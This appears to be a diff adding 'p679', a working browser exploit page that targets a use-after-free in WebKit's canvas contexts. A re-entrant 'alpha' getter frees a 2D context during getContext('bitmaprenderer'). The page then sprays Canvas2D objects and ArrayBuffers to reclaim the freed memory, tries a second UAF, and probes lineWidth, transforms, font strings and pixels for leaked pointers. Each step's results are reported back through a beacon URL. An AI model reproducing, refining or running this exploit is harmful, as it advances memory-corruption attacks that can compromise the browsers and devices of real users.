@@ -1,0 +1,301 @@
+<!--
+  p679: Double Canvas UAF — cross-type reclaim for info leak
+  
+  CONFIRMED: spray[11] reclaims first UAF. stale reads spray[11]'s data.
+  PROBLEM: stale and alias are the same object → no info leak from properties.
+  
+  APPROACH: Trigger SECOND UAF on spray[11]'s canvas.
+    1. First UAF: free outer canvas's 2d → spray → spray[11] reclaims
+    2. staleCtx points to spray[11]'s Canvas2D
+    3. Through staleCtx, do 64 save() calls → grow m_stateStack Vector
+       This allocates a SEPARATE heap buffer for the state stack
+    4. Second UAF: getContext('bitmaprenderer') on spray[11]'s CANVAS
+       → frees spray[11]'s Canvas2D (INCLUDING its state stack buffer)
+    5. Two freed allocations:
+       a. 768B Canvas2D object (IsoHeap → only Canvas2D can reclaim)
+       b. State stack buffer (~hundreds of bytes, general heap → anything can reclaim)
+    6. Spray ArrayBuffers sized to match the state stack buffer
+    7. A NEW Canvas2D reclaims the 768B slot (IsoHeap)
+    8. staleCtx now reads the NEW Canvas2D's state
+    9. BUT the NEW Canvas2D's m_stateStack.m_buffer might point to our AB!
+       Because the old buffer was freed and our AB took its place.
+    10. Reading lineWidth/transform through staleCtx reads from our AB data
+        → we control what it reads → we can probe the layout
+    
+  ALTERNATIVE: Skip step 3. After second UAF, spray only Canvas2D.
+    The new Canvas2D has different m_canvas pointer → we can try to 
+    detect which canvas it belongs to via drawing tests.
+  
+  CRASH_CLASS: HIGH (double UAF + cross-reference reads)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p679</title></head>
+<body>p679: double UAF
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P679-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+
+var f64=new Float64Array(1),u8f=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8f[i].toString(16)).slice(-2);return h;}
+
+emit('START','v1');flush();
+var retained=[];
+
+// ================================================================
+// PHASE A: First UAF + spray (same as p677/p678)
+// ================================================================
+emit('A','first-uaf');
+var staleCtx=null;
+try{
+  var oc=document.createElement('canvas');oc.width=4;oc.height=4;
+  document.body.appendChild(oc);
+  var triggered=false,innerCtx=null;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{get:function(){
+    if(!triggered){triggered=true;innerCtx=oc.getContext('2d');}
+    return true;
+  }});
+  oc.getContext('bitmaprenderer',opts);
+  staleCtx=innerCtx;
+  
+  // Spray Canvas2D
+  var spray1Ctxs=[],spray1Canvases=[];
+  for(var i=0;i<500;i++){
+    var c=document.createElement('canvas');c.width=4;c.height=4;
+    var ctx=c.getContext('2d');
+    ctx.lineWidth=100+i;
+    ctx.globalAlpha=0.5+i*0.0001;
+    spray1Canvases.push(c);spray1Ctxs.push(ctx);retained.push(c);
+  }
+  
+  var lw=staleCtx.lineWidth;
+  var idx1=Math.round(lw-100);
+  emit('A-ALIAS','spray1['+idx1+'] lw='+lw);
+  if(lw<100||lw>=600){emit('ABORT','no alias');flush();return;}
+  
+  var aliasCanvas=spray1Canvases[idx1];
+  var aliasCtx=spray1Ctxs[idx1];
+}catch(e){emit('A-ERR',e.message);flush();return;}
+flush();
+
+// ================================================================
+// PHASE B: Grow state stack through stale before second UAF
+// This creates a separate heap allocation for Vector<State> buffer
+// ================================================================
+emit('B','grow-state-stack');
+try{
+  // Do 64 saves through stale — this is spray[11]'s context
+  for(var i=0;i<64;i++){
+    staleCtx.save();
+  }
+  // Force realization by reading a property
+  var lwCheck=staleCtx.lineWidth;
+  emit('B-RESULT','64 saves done, lw='+lwCheck);
+  
+  // Set distinctive values at the TOP of the stack
+  staleCtx.lineWidth=777.777;
+  staleCtx.setTransform(11.11,22.22,33.33,44.44,55.55,66.66);
+  emit('B-TOP','lw='+staleCtx.lineWidth+' t.a='+d2hex(staleCtx.getTransform().a));
+}catch(e){emit('B-ERR',e.message);}
+flush();
+
+// ================================================================
+// PHASE C: Second UAF — trigger bitmaprenderer on spray[11]'s canvas
+// This frees spray[11]'s Canvas2D + its state stack buffer
+// ================================================================
+emit('C','second-uaf');
+var secondUafWorked=false;
+try{
+  // Try to trigger bitmaprenderer on the alias canvas
+  // This should free the alias's 2d context
+  var triggered2=false;
+  var opts2={};
+  Object.defineProperty(opts2,'alpha',{get:function(){
+    if(!triggered2){triggered2=true;}
+    return true;
+  }});
+  
+  try{
+    var bm2=aliasCanvas.getContext('bitmaprenderer',opts2);
+    emit('C-TRIGGER','triggered2='+triggered2+' bm2='+(bm2!==null));
+    secondUafWorked=true;
+  }catch(e2){
+    emit('C-TRIGGER-ERR',e2.name+':'+e2.message);
+    // Maybe bitmaprenderer fails because canvas already has a context
+    // Try a different approach
+  }
+}catch(e){emit('C-ERR',e.message);}
+flush();
+
+if(!secondUafWorked){
+  emit('C-FALLBACK','second UAF failed — canvas already has context');
+  // The canvas already has a 2d context, bitmaprenderer won't replace it
+  // (getContext returns null or the existing context for a different type)
+  // Try: can we null out the context somehow?
+  // Actually on WebKit 605.1.15, getContext with a different type might just return null
+  
+  // ALTERNATIVE APPROACH: Instead of double UAF, use the SAME stale context
+  // to manipulate the state stack in a way that reads OOB
+  emit('ALT','trying state-stack manipulation instead');
+  flush();
+  
+  // ================================================================
+  // PHASE D-ALT: Use save/restore asymmetry through stale
+  // We saved 64 times. Now restore 64 times through aliasCtx (same object).
+  // Then restore 1 MORE through staleCtx — underflow?
+  // ================================================================
+  try{
+    // Restore all 64 through alias
+    for(var i=0;i<64;i++) aliasCtx.restore();
+    emit('D-ALT-RESTORED','64 via alias');
+    
+    // Now both stale and alias should have m_stateStack.size=1
+    emit('D-ALT-LW','alias='+aliasCtx.lineWidth+' stale='+staleCtx.lineWidth);
+    
+    // Try to restore 1 more through stale — should be no-op (bottom of stack)
+    staleCtx.restore();
+    emit('D-ALT-UNDERFLOW','lw='+staleCtx.lineWidth+' hex='+d2hex(staleCtx.lineWidth));
+    
+    // Try getTransform after underflow
+    var t=staleCtx.getTransform();
+    emit('D-ALT-TRANSFORM','a='+d2hex(t.a)+' b='+d2hex(t.b)+' e='+d2hex(t.e)+' f='+d2hex(t.f));
+  }catch(e){emit('D-ALT-ERR',e.message);}
+  flush();
+  
+  // ================================================================
+  // PHASE E-ALT: Create ImageBitmap from stale canvas, read pixels
+  // ================================================================
+  emit('E-ALT','imageBitmap');
+  try{
+    if(typeof createImageBitmap==='function'){
+      // Draw something recognizable through stale
+      staleCtx.fillStyle='#FF0000';
+      staleCtx.fillRect(0,0,4,4);
+      
+      createImageBitmap(aliasCanvas).then(function(bmp){
+        emit('E-ALT-BMP','w='+bmp.width+' h='+bmp.height);
+        
+        // Draw bitmap to a fresh canvas and read pixels
+        var readCanvas=document.createElement('canvas');
+        readCanvas.width=bmp.width;readCanvas.height=bmp.height;
+        var readCtx=readCanvas.getContext('2d');
+        readCtx.drawImage(bmp,0,0);
+        var img=readCtx.getImageData(0,0,bmp.width,bmp.height);
+        var px=img.data;
+        var sample='';
+        for(var i=0;i<Math.min(32,px.length);i++)
+          sample+=('0'+px[i].toString(16)).slice(-2);
+        emit('E-ALT-PIXELS',sample);
+        flush();
+      }).catch(function(e){
+        emit('E-ALT-BMP-ERR',e.message);flush();
+      });
+    } else {
+      emit('E-ALT-SKIP','no createImageBitmap');
+    }
+  }catch(e){emit('E-ALT-ERR',e.message);}
+  flush();
+  
+} else {
+  // Second UAF worked!
+  emit('C-SUCCESS','second UAF triggered');
+  
+  // ================================================================
+  // PHASE D: Spray to reclaim the second freed Canvas2D
+  // Use AB-backed spray for the state stack buffer, Canvas2D spray for the object
+  // ================================================================
+  emit('D','second-spray');
+  try{
+    // Spray ArrayBuffers to reclaim the freed state stack buffer
+    // State stack was 65 × sizeof(State) — State is ~200-400 bytes
+    // Total buffer: ~13000-26000 bytes
+    var abSpray=[];
+    for(var size=8192;size<=32768;size+=4096){
+      for(var i=0;i<50;i++){
+        var ab=new ArrayBuffer(size);
+        var view=new Float64Array(ab);
+        // Fill with recognizable pattern — fake pointers
+        for(var j=0;j<view.length;j++){
+          // Put values that look like specific doubles when read as lineWidth
+          view[j]=999.0+j*0.001; // lineWidth 999.000, 999.001, etc
+        }
+        abSpray.push(ab);
+        retained.push(ab);
+      }
+    }
+    emit('D-AB-SPRAY','done, '+abSpray.length+' ABs');
+    
+    // Also spray Canvas2D to reclaim the 768B IsoHeap slot
+    var spray2Ctxs=[];
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');c.width=4;c.height=4;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=2000+i;
+      spray2Ctxs.push(ctx);retained.push(c);
+    }
+    emit('D-CTX-SPRAY','done, '+spray2Ctxs.length+' contexts');
+    
+    // Read through stale — what do we see now?
+    try{
+      var lw2=staleCtx.lineWidth;
+      emit('D-STALE-LW','lw='+lw2+' hex='+d2hex(lw2));
+      
+      if(lw2>=2000&&lw2<2200){
+        emit('D-RECLAIM','spray2['+(lw2-2000)+'] reclaimed the slot');
+      } else if(lw2>=999&&lw2<1100){
+        emit('D-AB-RECLAIM','*** AB DATA READ AS LINEWIDTH! lw='+lw2+' ***');
+        emit('D-LEAK','STATE STACK POINTS TO OUR ARRAYBUFFER!');
+      } else {
+        emit('D-UNKNOWN','lw='+lw2+' — might be pointer or corrupted');
+        emit('D-HEX',d2hex(lw2));
+      }
+      
+      // Read transform
+      var t=staleCtx.getTransform();
+      emit('D-TRANSFORM','a='+d2hex(t.a)+' b='+d2hex(t.b)+' c='+d2hex(t.c));
+      emit('D-TRANSFORM2','d='+d2hex(t.d)+' e='+d2hex(t.e)+' f='+d2hex(t.f));
+      
+      // Check for pointer-like values in transform
+      var tvals=[t.a,t.b,t.c,t.d,t.e,t.f];
+      for(var v=0;v<tvals.length;v++){
+        var hex=d2hex(tvals[v]);
+        var hi=parseInt(hex.slice(0,4),16);
+        if(hi>0&&hi<0xFFFF&&hex!=='3ff0000000000000'&&hex!=='0000000000000000'){
+          emit('D-PTR!','transform['+v+']='+hex+' ('+tvals[v]+')');
+        }
+      }
+    }catch(e){emit('D-READ-ERR',e.message);}
+  }catch(e){emit('D-ERR',e.message);}
+  flush();
+}
+
+// ================================================================
+// PHASE F: Font string leak attempt
+// font getter returns a serialized CSS font string
+// If the internal font pointer is corrupted, the serialization
+// might produce a string containing address bytes
+// ================================================================
+emit('F','font-leak');
+try{
+  var font=staleCtx.font;
+  emit('F-FONT',String(font).slice(0,120));
+  // Check for unusual characters (non-ASCII = possible pointer bytes in string)
+  var unusual=0;
+  for(var i=0;i<font.length;i++){
+    var cc=font.charCodeAt(i);
+    if(cc>127||cc<32){unusual++;emit('F-UNUSUAL','pos='+i+' char=0x'+cc.toString(16));}
+    if(unusual>=5)break;
+  }
+  if(unusual>0) emit('F-RESULT','UNUSUAL-CHARS — possible memory disclosure!');
+}catch(e){emit('F-ERR',e.message);}
+flush();
+
+setTimeout(function(){emit('DONE','p679-complete');flush();},2000);
+})();
+</script>
+</body>
+</html>
